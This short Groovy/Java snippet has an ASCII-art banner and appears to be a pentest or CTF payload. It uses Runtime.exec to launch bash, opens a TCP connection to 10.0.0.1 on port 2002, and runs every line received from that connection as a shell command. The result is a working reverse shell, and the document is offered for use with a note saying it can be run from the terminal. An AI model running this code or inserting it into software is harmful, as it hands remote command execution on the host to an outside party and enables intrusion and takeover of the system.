/*
 __                        __ _            ___                _____  
 / _|_ __ ___  _ __ ___    / _| | _____  __/ / |_ _   _ _ __  / _ \ \ 
| |_| '__/ _ \| '_ ` _ \  | |_| |/ _ \ \/ / || __| | | | '_ \| | | | |
|  _| | | (_) | | | | | | |  _| |  __/>  <| || |_| |_| | | | | |_| | |
|_| |_|  \___/|_| |_| |_| |_| |_|\___/_/\_\ | \__|\__,_|_| |_|\___/| |
                                           \_\                    /_/ 

*/

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

/* 

you can run this java code from terminal in the same way.

*/